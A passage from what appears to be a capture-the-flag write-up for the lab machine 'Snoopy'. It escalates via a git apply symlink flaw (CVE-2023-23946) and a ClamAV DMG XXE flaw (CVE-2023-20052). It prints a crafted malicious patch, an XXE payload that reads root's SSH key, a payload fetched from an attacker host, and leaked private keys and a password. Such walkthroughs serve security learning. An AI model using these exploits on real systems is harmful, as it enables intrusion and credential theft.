[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

The trick from [gtfobins](https://gtfobins.github.io/gtfobins/git/#file-write) won’t work since it have regex filter : `^apply -v [a-zA-Z0-9.]+$`.

We can this this [exploit](https://github.com/bruno-1337/CVE-2023-23946-POC) .
## Git vulnerability (CVE-2023-23946)

```bash
$ git --version
git version 2.34.1
```

```bash
cbrown@snoopy:/home$ # Step 1: Generate SSH keypair ON SNOOPY
ssh-keygen -t ed25519 -f /tmp/mykey -N ""

Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/mykey
Your public key has been saved in /tmp/mykey.pub
The key fingerprint is:
SHA256:Jvw5A/0jzDr/yrU2k07P4xRzNoWL2ynjQmYIs/de7LA cbrown@snoopy.htb
The key randomart image is:
+--[ED25519 256]--+
|                 |
|               . |
|              . .|
|     .o.     . o |
|      ++S.  + =  |
|      .Boo+. B o |
|       .O=*.B o  |
|      .o *B%.o   |
|      .o+*E=*.   |
+----[SHA256]-----+

cbrown@snoopy:/home$ # Step 2: Create exploit directory ON SNOOPY
mkdir /tmp/git_exploit
cd /tmp/git_exploit
git init
git config user.name "test"
git config user.email "test@test.com"

hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint: 	git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint: 	git branch -m <name>
Initialized empty Git repository in /tmp/git_exploit/.git/

cbrown@snoopy:/tmp/git_exploit$ # Step 3: Create symlink ON SNOOPY
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"

[master (root-commit) 99eab7d] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink
```

Now Create Malicious Patch:

```bash
cbrown@snoopy:/tmp/git_exploit$ cat > exploit.patch << EOF
diff --git a/symlink b/newsymlink
similarity index 100%
rename from symlink
rename to newsymlink
--
diff --git /dev/null b/newsymlink/authorized_keys
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/newsymlink/authorized_keys
@@ -0,0 +1 @@
+$(cat /tmp/mykey.pub)
EOF
```

Apply the patch:

```bash
cbrown@snoopy:/tmp/git_exploit$ chmod 777 /tmp/git_exploit
sudo -u sbrown /usr/bin/git apply -v exploit.patch

Checking patch symlink => newsymlink...
Checking patch newsymlink/authorized_keys...
Applied patch symlink => newsymlink cleanly.
Applied patch newsymlink/authorized_keys cleanly.

cbrown@snoopy:/tmp/git_exploit$ ls -la /home/sbrown/.ssh/authorized_keys
ls: cannot access '/home/sbrown/.ssh/authorized_keys': Permission denied
```

We see permission denied but we can copy it from our Attack Machine.

```bash
$ scp cbrown@snoopy.htb:/tmp/mykey /tmp/snoopy_key
cbrown@snoopy.htb's password: sn00pedcr3dential!!!
mykey    
```

```bash
$ cat /tmp/snoopy_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBDKOEKdkPgXJ6PENz/fq7W3ubXUjptM7F1nni0/EMxKQAAAJi9f1MpvX9T
KQAAAAtzc2gtZWQyNTUxOQAAACBDKOEKdkPgXJ6PENz/fq7W3ubXUjptM7F1nni0/EMxKQ
AAAECtNanPEFvS8U8FUU8ACgIq+Nfa1X1CXNBPunUCQuWJA0Mo4Qp2Q+Bcno8Q3P9+rtbe
5tdSOm0zsXWeeLT8QzEpAAAAEWNicm93bkBzbm9vcHkuaHRiAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ ssh -i /tmp/snoopy_key sbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

sbrown@snoopy:~$ ls
scanfiles  user.txt
sbrown@snoopy:~$ cat user.txt
adc28956f0c3adb8d707251f0388c224
```
# Privilege Escalation

```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

```bash
sbrown@snoopy:/tmp$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

Found 2 CVEs : `CVE-2023-20052`, `CVE-2023-20032`. Try [this](https://github.com/nokn0wthing/CVE-2023-20052).
## ### Exploiting XXE in ClamAV (CVE-2023-20052)

Docker build gives error so fixed:

```bash
$ git clone https://github.com/nokn0wthing/CVE-2023-20052
Cloning into 'CVE-2023-20052'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 15 (delta 4), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 47.69 KiB | 7.95 MiB/s, done.
Resolving deltas: 100% (4/4), done.

$ cd CVE-2023-20052/
```

```dockerfile
FROM ubuntu:16.04

RUN apt-get update
RUN apt-get install -y ca-certificates gnupg wget

RUN apt-get install -y libssl-dev gcc g++ cmake zlib1g-dev genisoimage bbe git

RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git
WORKDIR /libdmg-hfsplus
RUN cmake .
RUN make
RUN cp dmg/dmg /bin
WORKDIR /exploit

CMD ["/bin/bash"]
```

```bash
$ sudo docker build -t cve-2023-20052 .
```

```bash
$ sudo docker run -it --rm -v $(pwd):/exploit cve-2023-20052
root@da660b373f10:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 6784
Total directory bytes: 36864
Path table size(bytes): 240
Max brk space used 22000
125 extents written (0 MB)
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=500, left=500
Writing XML data...
Generating UDIF metadata...
Master checksum: a98c434f
Writing out UDIF resource file...
Cleaning up...
Done
root@da660b373f10:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

```bash
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.229.5 - - [16/Oct/2025 04:33:19] "GET /exploit.dmg HTTP/1.1" 200 -
```

```bash
sbrown@snoopy:~$ cd /home/sbrown/scanfiles
sbrown@snoopy:~/scanfiles$ wget 10.10.14.122:8080/exploit.dmg
--2025-10-16 09:33:43--  http://10.10.14.122:8080/exploit.dmg
Connecting to 10.10.14.122:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 113897 (111K) [application/x-apple-diskimage]
Saving to: ‘exploit.dmg’

exploit.dmg                       100%[===========================================================>] 111.23K   488KB/s    in 0.2s    

2025-10-16 09:33:44 (488 KB/s) - ‘exploit.dmg’ saved [113897/113897]
```

```bash
sbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg

<SNIP>
LibClamAV debug: unknown inst type: 67
LibClamAV debug: unknown inst type: 67
LibClamAV debug: unknown inst type: 67
LibClamAV debug: unknown inst type: 67
LibClamAV debug: unknown inst type: 67
LibClamAV debug: unknown inst type: 67
LibClamAV debug: Parsed 53 BBs, 226 instructions
LibClamAV debug: Parsed 1 functions
LibClamAV debug: Bytecode: BC_STARTUP running (builtin)
LibClamAV debug: Bytecode 0: executing in interpreter mode
LibClamAV debug: bytecode: registered ctx variable at 0x7f47e4e9bf00 (+256) id 6
LibClamAV debug: bytecode: registered ctx variable at 0x7f47e53fb1cc (+2) id 2
LibClamAV debug: bytecode: registered ctx variable at 0x7f47e4e9c000 (+256) id 1
LibClamAV debug: bytecode: registered ctx variable at 0x7f47e53fb1c8 (+4) id 5
LibClamAV debug: bytecode: registered ctx variable at 0x7f47e53faf40 (+648) id 4
LibClamAV debug: bytecode: registered ctx variable at 0x13d78e0 (+744) id 7
LibClamAV debug: bytecode debug: startup: bytecode execution in auto mode
LibClamAV debug: interpreter bytecode run finished in 29us, after executing 96 opcodes
LibClamAV debug: previous tempfile had 0 bytes
LibClamAV debug: Bytecode: disable status is 0
LibClamAV debug: bytecode: JIT disabled
LibClamAV debug: Cannot prepare for JIT, LLVM is not compiled or not linked
LibClamAV debug: Bytecode: 0 bytecode prepared with JIT, 91 prepared with interpreter, 91 total
LibClamAV debug: Checking realpath of /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: Recognized binary data
LibClamAV debug: clean_cache_check: 39293f0f4ef7aa09fe11337693e6811d is negative
LibClamAV debug: in cli_check_mydoom_log()
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: Matched signature for file type DMG container file at 113385
LibClamAV debug: matcher_run: performing regex matching on full map: 0+113897(113897) >= 113897
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: DMG signature found at 113385
LibClamAV debug: cli_scandmg: Found koly block @ 113385
LibClamAV debug: cli_scandmg: data offset 0 len 109708
LibClamAV debug: cli_scandmg: XML offset 109708 len 3727
LibClamAV debug: cli_scandmg: Extracting into /tmp/20251016_093408-scantemp.c12cc39dfd/dmg-tmp.414d6dc233
LibClamAV debug: cli_magic_scan_nested_fmap_type: [109708, +3727)
LibClamAV debug: magic_scan_nested_fmap_type: [0, +113897), [109708, +3727)
LibClamAV debug: Recognized ASCII text
LibClamAV debug: clean_cache_check: a576dd2b010d1b8b5d2674a496bd9059 is negative
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3727(3727) >= 3727
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: in cli_scanscript()
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3274(3274) >= 3274
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3274(3274) >= 3274
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: a576dd2b010d1b8b5d2674a496bd9059 (level 0)
LibClamAV debug: cli_scandmg: wanted blkx, text value is 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
<SNIP>
```

```bash
$ ssh -i id_rsa root@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 12 21:28:56 2023 from 10.10.14.46
root@snoopy:~# cat root.txt
97b25a98f19f0ba3dc32ab075ea3918f
```

---


